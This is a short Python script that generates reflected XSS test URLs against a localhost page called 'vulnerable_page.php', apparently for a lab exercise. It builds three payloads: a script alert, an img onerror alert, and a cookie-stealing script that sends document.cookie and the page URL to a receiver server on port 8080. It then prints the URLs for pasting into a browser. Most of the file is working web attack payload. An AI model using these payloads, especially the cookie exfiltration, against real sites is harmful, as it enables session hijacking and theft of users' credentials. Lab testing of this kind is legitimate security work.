#!/usr/bin/env python3
"""
Quick script to generate XSS test URLs
"""
import urllib.parse

# Test 1: Simple alert
simple_alert = "<script>alert('XSS Works!')</script>"
url1 = f"http://localhost/vulnerable_page.php?search={urllib.parse.quote(simple_alert)}"

# Test 2: Cookie stealing
cookie_stealer = "<script>var i=new Image();i.src='http://localhost:8080/cookie_receiver.php?cookie='+encodeURIComponent(document.cookie)+'&url='+encodeURIComponent(window.location.href);</script>"
url2 = f"http://localhost/vulnerable_page.php?search={urllib.parse.quote(cookie_stealer)}"

# Test 3: Image onerror
img_payload = "<img src=x onerror=alert('XSS')>"
url3 = f"http://localhost/vulnerable_page.php?search={urllib.parse.quote(img_payload)}"

print("="*70)
print("XSS TEST URLS")
print("="*70)
print("\n1. SIMPLE ALERT TEST:")
print(url1)
print("\n2. COOKIE STEALING (requires cookie receiver server on port 8080):")
print(url2)
print("\n3. IMAGE ONERROR TEST:")
print(url3)
print("\n" + "="*70)
print("\nCopy and paste any URL above into your browser to test!")
print("="*70)


